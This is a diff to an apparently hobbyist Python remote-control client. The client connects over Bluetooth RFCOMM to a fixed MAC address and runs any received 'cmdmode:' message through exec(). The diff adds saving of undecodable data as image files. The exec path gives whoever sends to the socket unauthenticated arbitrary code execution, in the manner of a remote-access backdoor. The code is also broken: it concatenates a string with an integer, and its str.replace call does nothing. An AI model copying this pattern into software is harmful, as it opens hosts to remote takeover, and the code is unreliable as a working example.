@@ -5,6 +5,7 @@ import pyautogui
 import os 
 
 screeniecounter = 0
+fileerror= 0
 client = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
 client.connect(("6c:2f:80:71:84:8b", 4))
 
@@ -21,8 +22,11 @@ try:
         try:
             data = data.decode()
         except Exception as e:
-            pass
-        
+            with open("img"+fileerror+".png","wb") as file:
+                file.write(data)
+            fileerror += 1
+            continue
+
         print(data)
         if data == "1":
            client.send(ClientUI.Connect().encode())
@@ -34,8 +38,7 @@ try:
         elif "cmdmode:" in data:
             str.replace('cmdmode:', '')
             exec(data)
-        else:
-            print(data)
+            
     print("Update Window")
 except OSError as e:
     pass
